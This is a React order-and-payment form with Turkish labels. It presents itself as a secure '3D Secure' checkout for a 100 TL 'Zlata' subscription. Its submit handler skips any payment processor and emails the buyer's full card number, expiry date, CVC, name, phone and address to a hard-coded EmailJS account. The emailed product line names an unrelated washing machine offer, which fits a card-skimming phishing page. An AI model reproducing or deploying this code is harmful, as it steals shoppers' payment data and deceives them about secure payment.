import React, { useEffect, useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const OrderForm = () => {
  const [showAddressForm, setShowAddressForm] = useState(true); // State to manage address form visibility
  const [showPaymentForm, setShowPaymentForm] = useState(false); // State to manage payment form visibility
  const [addressFormValid, setAddressFormValid] = useState(false); // State to manage address form validity

  const formatCreditCardNumber = (value) => {
    // Remove non-numeric characters
    let formattedValue = value.replace(/\D/g, "");

    // Insert space every 4 characters
    formattedValue = formattedValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    return formattedValue;
  };

  const handleInputChange = (event) => {
    const { name, value } = event.target;

    // Format the credit card number before setting state
    const formattedValue = formatCreditCardNumber(value);

    // Update the state or formData
    handleChange({
      target: {
        name,
        value: formattedValue,
      },
    });
  };

  const formatExpirationDate = (value) => {
    // Remove non-numeric characters
    let formattedValue = value.replace(/\D/g, "");

    // Insert '/' after first 2 characters
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    return formattedValue;
  };

  const handleInputChange2 = (event) => {
    const { name, value } = event.target;

    // Format the expiration date before setting state
    const formattedValue = formatExpirationDate(value);

    // Update the state or formData
    handleChange({
      target: {
        name,
        value: formattedValue,
      },
    });
  };

  const [formData, setFormData] = useState({
    urun: "1 ADET KATLANIR ÇAMAŞIR MAKİNESİ 1599TL - ÜCRETSİZ KARGO",
    odeme: "Kapıda Kredi Kartı",
    isim: "",
    soyad: "",
    tel: "",
    il: "",
    ilce: "",
    adres: "",
    kartSahibi: "",
    kartNumarasi: "",
    sonKullanmaTarihi: "",
    zip: "",
    cvc: "",
    tarihSaat: "", // Yeni alan
  });

  const form = useRef();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const sendEmail = (e) => {
    e.preventDefault();

    // Güncel tarih ve saati al
    const now = new Date();
    const formattedDateTime = `${now.getDate()}/${
      now.getMonth() + 1
    }/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}`;

    setFormData({
      ...formData,
      tarihSaat: formattedDateTime,
    });

    // Prepare all form data including address and payment details
    const templateParams = {
      ...formData,
      urun: "1 ADET KATLANIR ÇAMAŞIR MAKİNESİ 1599TL - ÜCRETSİZ KARGO",
      odeme: "Kapıda Kredi Kartı",
      tarihSaat: formattedDateTime,
    };

    emailjs
      .send(
        "service_mwe4ukl",
        "template_vpo7lz2",
        templateParams,
        "V57OWPDudEhHuEDPU"
      )
      .then(
        () => {
          alert("Siparişiniz alındı!"); // Success message
        },
        (error) => {
          alert("Sipariş alınırken bir hata oluştu:", error.text); // Error message
        }
      );
  };

  const validateAddressForm = () => {
    const { isim, soyad, tel, il, ilce, adres } = formData;
    const isValid =
      isim !== "" &&
      soyad !== "" &&
      tel !== "" &&
      il !== "" &&
      ilce !== "" &&
      adres !== "";
    setAddressFormValid(isValid);
    return isValid;
  };

  const goToPaymentForm = () => {
    if (validateAddressForm()) {
      setShowAddressForm(false);
      setShowPaymentForm(true);
    } else {
      alert("Lütfen zorunlu alanları doldurun.");
    }
  };

  const goBackToAddressForm = () => {
    setShowPaymentForm(false);
    setShowAddressForm(true);
  };

  return (
    <div className="font-[sans-serif] bg-white p-4 lg:mt-24 flex justify-center items-center">
      <div className="md:max-w-5xl max-w-xl mx-auto">
        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 max-md:order-1">
            <h2 className="text-3xl font-extrabold text-gray-800">
              Zlata'ya Abone Ol
            </h2>
            <p className="text-gray-800 text-sm mt-4 max-w-[500px]">
              3D Secure ile güvenli ödeme yapabilirsiniz. Ödeme sadece tek
              seferliktir. Ödeme yaptıktan sonra size verilen sipariş numarasını
              saklayın
            </p>

            {showAddressForm && (
              <form className="mt-8 max-w-lg">
                <div className="grid gap-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <input
                        type="text"
                        id="isim"
                        name="isim"
                        placeholder="Adınız"
                        className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                        value={formData.isim}
                        onChange={handleChange}
                        required
                      />
                    </div>
                    <div>
                      <input
                        id="soyad"
                        name="soyad"
                        placeholder="Soyadınız"
                        type="text"
                        className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                        value={formData.soyad}
                        onChange={handleChange}
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <input
                      id="tel"
                      name="tel"
                      type="tel"
                      placeholder="Telefon"
                      className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                      value={formData.tel}
                      onChange={handleChange}
                      required
                    />
                  </div>

                  <div>
                    <p className="text-gray-800 text-sm mt-4 max-w-[500px]">
                      Fatura bilgisi için aşağıdaki bilgileri doldurun.
                      Faturanız sms ile gönderilecektir.
                    </p>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <input
                        id="il"
                        name="il"
                        type="text"
                        placeholder="İl"
                        className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                        value={formData.il}
                        onChange={handleChange}
                        required
                      />
                    </div>
                    <div>
                      <input
                        id="ilce"
                        name="ilce"
                        type="text"
                        placeholder="İlçe"
                        className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                        value={formData.ilce}
                        onChange={handleChange}
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <input
                      id="zip"
                      name="zip"
                      type="text"
                      placeholder="Posta Kodu (zorunlu değil)"
                      className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                      value={formData.posta}
                      onChange={handleChange}
                    />
                  </div>

                  <div>
                    <textarea
                      id="adres"
                      name="adres"
                      type="text"
                      placeholder="Adres"
                      rows={3}
                      className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none max-h-[150px]"
                      value={formData.adres}
                      onChange={handleChange}
                      required
                    />
                  </div>

                  <div className="flex justify-end mt-4">
                    <button
                      type="button"
                      className="px-4 py-2 bg-purple-500 text-white rounded-md hover:bg-purple-600"
                      onClick={goToPaymentForm}
                    >
                      İleri
                    </button>
                  </div>
                </div>
              </form>
            )}

            {showPaymentForm && (
              <form className="mt-8 max-w-lg" ref={form} onSubmit={sendEmail}>
                <div className="grid gap-4">
                  <div>
                    <input
                      id="kartSahibi"
                      name="kartSahibi"
                      type="text"
                      placeholder="Kart Sahibi Ad Soyad"
                      className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                      value={formData.kartSahibi}
                      onChange={handleChange}
                      required
                    />
                  </div>

                  <div className="flex bg-gray-100 border rounded-md focus-within:border-purple-500 focus-within:bg-transparent overflow-hidden">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="w-6 ml-3"
                      viewBox="0 0 32 20"
                    >
                      <circle cx="10" cy="10" r="10" fill="#f93232" />
                      <path
                        fill="#fed049"
                        d="M22 0c-2.246 0-4.312.75-5.98 2H16v.014c-.396.298-.76.634-1.107.986h2.214c.308.313.592.648.855 1H14.03a9.932 9.932 0 0 0-.667 1h5.264c.188.324.365.654.518 1h-6.291a9.833 9.833 0 0 0-.377 1h7.044c.104.326.186.661.258 1h-7.563c-.067.328-.123.66-.157 1h7.881c.039.328.06.661.06 1h-8c0 .339.027.67.06 1h7.882c-.038.339-.093.672-.162 1h-7.563c.069.341.158.673.261 1h7.044a9.833 9.833 0 0 1-.377 1h-6.291c.151.344.321.678.509 1h5.264a9.783 9.783 0 0 1-.669 1H14.03c.266.352.553.687.862 1h2.215a10.05 10.05 0 0 1-1.107.986A9.937 9.937 0 0 0 22 20c5.523 0 10-4.478 10-10S27.523 0 22 0z"
                      />
                    </svg>
                    <input
                      type="text"
                      id="kartNumarasi"
                      name="kartNumarasi"
                      placeholder="Kart Numarası"
                      className="px-4 py-3.5 text-gray-800 w-full text-sm outline-none bg-transparent"
                      value={formData.kartNumarasi}
                      onChange={handleInputChange}
                      maxLength="19" // Max length with spaces included
                      required
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <input
                        type="text"
                        id="sonKullanmaTarihi"
                        name="sonKullanmaTarihi"
                        placeholder="Son Kullanma Tarihi"
                        className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                        value={formData.sonKullanmaTarihi}
                        onChange={handleInputChange2}
                        maxLength="5" // Max length for MM/YY format
                        required
                      />
                    </div>
                    <div>
                      <input
                        id="cvc"
                        name="cvc"
                        type="number"
                        placeholder="CCV"
                        className="px-4 py-3.5 bg-gray-100 text-gray-800 w-full text-sm border rounded-md focus:border-purple-500 focus:bg-transparent outline-none"
                        value={formData.cvc}
                        onChange={handleChange}
                        required
                      />
                    </div>
                  </div>

                  <div className="flex justify-between mt-8">
                    <button
                      type="button"
                      className="px-4 py-2 bg-gray-300 text-gray-700 rounded-md hover:bg-gray-400"
                      onClick={goBackToAddressForm}
                    >
                      Geri
                    </button>
                    <button
                      type="submit"
                      className="w-32 py-2.5 text-sm bg-purple-500 text-white rounded-md hover:bg-purple-600 tracking-wide"
                    >
                      Ödeme Yap
                    </button>
                  </div>

                  <input
                    type="hidden"
                    name="tarihSaat"
                    value={formData.tarihSaat}
                  />
                </div>
              </form>
            )}
          </div>

          <div className="bg-gray-100 p-6 rounded-md max-h-[270px]">
            <h2 className="text-3xl font-extrabold text-gray-800">100 TL</h2>

            <ul className="text-gray-800 mt-8 space-y-4">
              <li className="flex flex-wrap gap-4 text-sm">
                Zlata Abid <span className="ml-auto font-bold">100 TL</span>
              </li>
              <li className="flex flex-wrap gap-4 text-sm">
                Videolar <span className="ml-auto font-bold">Ücretsiz</span>
              </li>
              <li className="flex flex-wrap gap-4 text-sm">
                Resimler <span className="ml-auto font-bold">Ücretsiz</span>
              </li>
              <li className="flex flex-wrap gap-4 text-sm font-bold border-t-2 pt-4">
                Toplam <span className="ml-auto">100 TL</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OrderForm;
